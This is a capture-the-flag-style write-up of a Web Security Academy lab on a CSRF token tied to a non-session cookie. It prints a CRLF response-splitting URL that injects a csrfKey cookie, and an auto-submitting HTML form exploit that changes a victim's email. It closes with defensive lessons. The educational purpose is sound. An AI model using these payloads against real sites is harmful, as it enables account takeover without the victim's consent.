# CSRF – Token Tied to Non-Session Cookie

(**Web Security Academy**)

This lab demonstrates a **broken CSRF defense** where the application uses CSRF tokens, but the token validation relies on a **separate cookie (`csrfKey`) that is not bound to the user’s session**.
By abusing **HTTP response splitting via a reflected search parameter**, an attacker can inject their own CSRF cookie into a victim’s browser and successfully perform a CSRF attack.

---

## Lab: CSRF Where Token Is Tied to Non-Session Cookie

**Category:** Cross-Site Request Forgery (CSRF)
**Protection Mechanism:** CSRF token + non-session cookie
**Difficulty:** Practitioner
**Tools Used:** Burp Suite Community Edition
**Status:** Solved

---

## What This Lab Is About

The application attempts to defend against CSRF by:

* Including a CSRF token in requests
* Validating the token against a cookie (`csrfKey`)

However:

* The `csrfKey` cookie is **not tied to the user’s session**
* The application trusts any matching `csrfKey` + CSRF token pair
* The cookie can be **injected into the victim’s browser**

This results in a **full CSRF bypass**.

---

## Target Functionality

Vulnerable endpoint:

```id="n7p4de"
POST /my-account/change-email
```

Parameters:

* `email`
* `csrf`

Cookies:

* `session`
* `csrfKey`

---

## Accounts Provided by the Lab

```id="7k3x91"
wiener:peter
carlos:montoya
```

These accounts are used to demonstrate **cross-user reuse of CSRF material**.

---

## Key Observations

### Cookie Behavior

* Modifying the `session` cookie → user is logged out
* Modifying the `csrfKey` cookie → CSRF token is rejected
* Indicates `csrfKey` is **not session-bound**

### Token Validation Flaw

* A valid CSRF token is accepted **as long as the csrfKey cookie matches**
* Token ownership is never verified against the session

---

## Vulnerable Flow

1. Attacker obtains:

   * A valid CSRF token
   * A corresponding `csrfKey` cookie
2. Attacker injects `csrfKey` into victim’s browser
3. Victim submits forged request
4. Server validates token using injected cookie
5. Email address is changed

---

## Exploitation Steps (Community Edition)

1. Logged in as **wiener**
2. Submitted the Update Email form
3. Captured request in **Burp Proxy**
4. Sent request to **Repeater**
5. Observed CSRF token + `csrfKey` dependency
6. Logged in as **carlos** in incognito
7. Captured Carlos’s update email request
8. Replaced:

   * `csrfKey` cookie
   * `csrf` parameter
     with Wiener’s values
9. Request accepted
10. Confirmed CSRF material is reusable
11. Returned to Wiener session
12. Performed a search request
13. Observed reflected input in `Set-Cookie` header
14. Identified **HTTP response splitting vulnerability**
15. Crafted cookie injection payload
16. Built CSRF exploit with cookie injection
17. Delivered exploit to victim
18. Lab marked as solved

---

## Cookie Injection Payload

The search endpoint reflects input into response headers, allowing cookie injection:

```id="f9l2tw"
https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

This forces the victim’s browser to store the attacker’s `csrfKey`.

---

## Final CSRF Exploit Payload

```html id="ex4k1m"
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-cookie@web-security-academy.net">
    <input type="hidden" name="csrf" value="VALID_TOKEN">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
```

---

## Why This Works

* `csrfKey` cookie is trusted but not session-bound
* Cookie can be injected via response splitting
* CSRF token validation relies on attacker-controlled state
* Victim’s session cookies are automatically included

---

## Impact

An attacker can:

* Inject CSRF validation cookies
* Perform authenticated actions cross-user
* Fully bypass CSRF protections
* Chain with header injection vulnerabilities

Severity: **High**

---

## Key Lessons Learned

* CSRF cookies must be session-bound
* Never trust client-controlled validation state
* CSRF tokens alone are not enough
* Header injection can completely undermine CSRF defenses
* Defense-in-depth is mandatory

---

## Defensive Takeaways

To prevent this vulnerability:

* Bind CSRF tokens to user sessions
* Avoid CSRF validation via separate cookies
* Sanitize reflected input in headers
* Prevent CRLF injection
* Enforce SameSite cookies correctly

---

## Final Summary

* CSRF token present but poorly implemented
* Validation relies on injectable cookie
* HTTP response splitting enables cookie injection
* Manual exploit built with Burp Suite Community Edition
* Victim’s email changed without consent

 
